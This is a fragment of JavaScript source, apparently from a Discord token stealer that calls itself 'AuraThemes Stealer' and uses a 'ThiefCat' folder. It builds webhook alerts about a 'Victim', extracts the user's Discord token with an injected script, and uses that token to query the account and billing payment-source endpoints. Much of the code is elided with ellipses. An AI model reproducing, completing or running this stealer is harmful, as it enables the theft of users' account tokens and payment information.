...
const makeEmbed = async ({ title, fields, image, thumbnail, description }) => {
  var params = {
    ...
    avatar_url: "https://i.imgur.com/yVnOSeS.gif",
    content: "",
    embeds: [
      {
        title: title,
...
const FirstTime = async () => {
  ...
  if (fs.existsSync(__dirname + "/ThiefCat")) {
    ...
    if (!token) {
      ...
      if (!user.avatar)
        var userAvatar =
          "https://i.imgur.com/yVnOSeS.gif";
      if (!user.banner)
        var userBanner =
          "https://i.imgur.com/CeFqJOc.gif";
    ...
    if (
      ...
      if (!token) {
        var params = await makeEmbed({
          title:
            "AuraThemes Stealer User log out (User not Logged in before)",
          fields: [
            {
              name: "Injection Info",
        ...
        var params = await makeEmbed({
          title:
            "AuraThemes Stealer Victim got logged out",
...
async function K4itrunTuclcavectesfonctions() {
  var token = await execScript(tokenScript);
  var user = await getURL("https://discord.com/api/v8/users/@me", token);
  var billing = await getURL(
    "https://discord.com/api/v9/users/@me/billing/payment-sources",
